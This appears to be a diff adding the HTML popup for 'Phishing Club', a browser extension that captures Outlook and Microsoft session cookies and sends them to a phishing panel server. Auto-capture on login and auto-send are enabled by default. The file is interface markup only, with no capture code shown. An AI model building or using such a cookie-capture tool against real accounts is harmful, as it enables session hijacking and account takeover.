@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=380">
+  <link rel="stylesheet" href="popup.css">
+  <title>Phishing Club - Cookie Capture</title>
+</head>
+<body>
+  <div class="container">
+
+    <!-- Header -->
+    <div class="header">
+      <div class="header-title">
+        <img src="icons/icon48.png" alt="PC" class="header-logo">
+        <div>
+          <h1>Phishing Club</h1>
+          <div class="header-subtitle">Cookie Capture Extension</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Server Connection -->
+    <div class="section">
+      <div class="section-title">Server Connection</div>
+      <div class="section-desc">Enter your Phishing Club panel URL (e.g. https://panel.example.com:8443)</div>
+      <div class="input-group">
+        <input type="text" id="serverUrl" placeholder="https://your-server:8443">
+        <button class="btn btn-primary" id="connectBtn">Connect</button>
+      </div>
+      <div class="status-msg" id="statusMsg"></div>
+    </div>
+
+    <!-- Capture -->
+    <div class="section">
+      <div class="section-title">
+        Cookie Capture
+        <button class="btn btn-sm btn-danger" id="clearBtn">Clear All</button>
+      </div>
+      <div class="section-desc">
+        Sign into Outlook in this browser first, then capture the session cookies.
+        Cookies from all Microsoft/Outlook domains will be collected.
+      </div>
+      <button class="btn btn-capture" id="captureBtn">Capture Outlook Cookies</button>
+
+      <!-- Capture Result -->
+      <div class="capture-result" id="captureResult" style="display:none">
+        <div class="capture-stats">
+          <div class="stat">
+            <span class="stat-value" id="cookieCount">0</span>
+            <span class="stat-label">Cookies</span>
+          </div>
+          <div class="stat">
+            <span class="stat-value" id="criticalCount">0</span>
+            <span class="stat-label">Critical</span>
+          </div>
+          <div class="stat">
+            <span class="stat-value" id="domainCount">0</span>
+            <span class="stat-label">Domains</span>
+          </div>
+        </div>
+        <div class="auth-status" id="authStatus"></div>
+        <div class="domain-tags" id="domainTags"></div>
+        <div class="capture-actions">
+          <button class="btn btn-send" id="sendCookiesBtn" disabled>Send to Server</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Settings -->
+    <div class="section">
+      <div class="section-title">Settings</div>
+      <label class="toggle-row">
+        <span>Extension Enabled</span>
+        <input type="checkbox" id="enabledToggle" checked>
+        <span class="toggle-slider"></span>
+      </label>
+      <label class="toggle-row">
+        <span>Auto-send cookies to server</span>
+        <input type="checkbox" id="autoCaptureToggle" checked>
+        <span class="toggle-slider"></span>
+      </label>
+      <label class="toggle-row">
+        <span>Auto-capture on Outlook login</span>
+        <input type="checkbox" id="autoCaptureOnLoginToggle" checked>
+        <span class="toggle-slider"></span>
+      </label>
+      <label class="toggle-row">
+        <span>Show notifications</span>
+        <input type="checkbox" id="notificationsToggle" checked>
+        <span class="toggle-slider"></span>
+      </label>
+    </div>
+
+    <!-- History -->
+    <div class="section">
+      <div class="section-title">Capture History</div>
+      <div class="history-list" id="historyList">
+        <div class="no-items">No captures yet. Sign into Outlook and click "Capture Outlook Cookies".</div>
+      </div>
+    </div>
+
+  </div>
+
+  <script src="popup.js"></script>
+</body>
+</html>
